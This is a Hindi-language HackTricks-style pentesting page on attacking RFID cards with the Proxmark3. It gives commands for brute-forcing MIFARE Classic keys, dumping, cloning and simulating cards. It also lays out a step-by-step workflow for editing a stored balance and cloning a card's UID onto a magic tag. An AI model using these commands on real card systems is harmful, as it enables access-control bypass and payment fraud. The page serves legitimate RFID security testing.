# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 के साथ RFID Systems पर हमला

actively maintained RRG/Iceman Proxmark3 client और matching firmware को install करें, फिर उस build के साथ command syntax की पुष्टि करें, क्योंकि नीचे दिखाए गए पुराने commands बदल चुके हो सकते हैं।<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KB पर हमला

MIFARE Classic 1K में **16 sectors** होते हैं, और प्रत्येक sector में **16 bytes** के **4 blocks** होते हैं। Manufacturer block 0 में UID/manufacturer data होता है और genuine NXP cards पर यह read-only होता है; special clone या “magic” cards में इसे rewrite करने की अनुमति हो सकती है।<sup>[[1]](#references)[[2]](#references)</sup>\
प्रत्येक sector को access करने के लिए आपको **2 keys** (**A** और **B**) चाहिए, जो **प्रत्येक sector के block 3** में stored होती हैं (sector trailer)। Sector trailer में **access bits** भी stored होते हैं, जो 2 keys का उपयोग करके **प्रत्येक block** की **read और write** permissions निर्धारित करते हैं।\
उदाहरण के लिए, यदि आपको पहली key पता हो तो read permissions और दूसरी key पता हो तो write permissions देने के लिए 2 keys उपयोगी होती हैं।

कई attacks किए जा सकते हैं
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 **eavesdropping** जैसे अन्य actions करने की अनुमति देता है, जिससे **Tag to Reader communication** को सुनकर sensitive data खोजने का प्रयास किया जा सकता है। इस card में आप communication को केवल sniff करके उपयोग की गई key calculate कर सकते हैं, क्योंकि इस्तेमाल किए गए **cryptographic operations weak** हैं और plain तथा cipher text जानने पर आप इसकी गणना कर सकते हैं (`mfkey64` tool)।<sup>[[3]](#references)</sup>

#### MiFare Classic में stored-value abuse के लिए quick workflow

जब terminals Classic cards पर balances store करते हैं, तो एक typical end-to-end flow इस प्रकार होता है:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
नोट्स

- `hf mf autopwn` nested/darkside/HardNested-style attacks को orchestrate करता है, keys recover करता है, और client dumps folder में dumps बनाता है।<sup>[[1]](#references)</sup>
- Block 0/UID लिखना केवल magic gen1a/gen2 cards पर काम करता है। Normal Classic cards में UID read-only होता है।<sup>[[2]](#references)</sup>
- कई deployments Classic "value blocks" या simple checksums का उपयोग करते हैं। Editing के बाद सभी duplicated/complemented fields और checksums consistent होने सुनिश्चित करें।<sup>[[4]](#references)</sup>

एक higher-level methodology और mitigations यहां देखें:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems कभी-कभी **nonbranded या noncommercial tags** का उपयोग करते हैं। इस स्थिति में, आप tags को **custom raw commands भेजने** के लिए Proxmark3 का उपयोग कर सकते हैं।
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
इस जानकारी के साथ आप card और उससे communicate करने के तरीके के बारे में information खोजने का प्रयास कर सकते हैं। Proxmark3 इस तरह के raw commands भेजने की अनुमति देता है: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 software में पहले से **automation scripts** की एक list मौजूद होती है, जिनका उपयोग आप simple tasks करने के लिए कर सकते हैं। पूरी list प्राप्त करने के लिए `script list` command का उपयोग करें। इसके बाद, script के नाम के साथ `script run` command का उपयोग करें:
```
proxmark3> script run mfkeys
```
आप **tag readers** को **fuzz** करने के लिए एक script बना सकते हैं। किसी **valid card** के डेटा को कॉपी करके, बस एक **Lua script** लिखें जो एक या अधिक random **bytes** को **randomize** करे और हर iteration में जाँच करे कि **reader crashes** होता है या नहीं।

## References

- [1] [Proxmark3 विकी: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 विकी: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1 पर NXP का बयान](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value में NFC card vulnerability exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
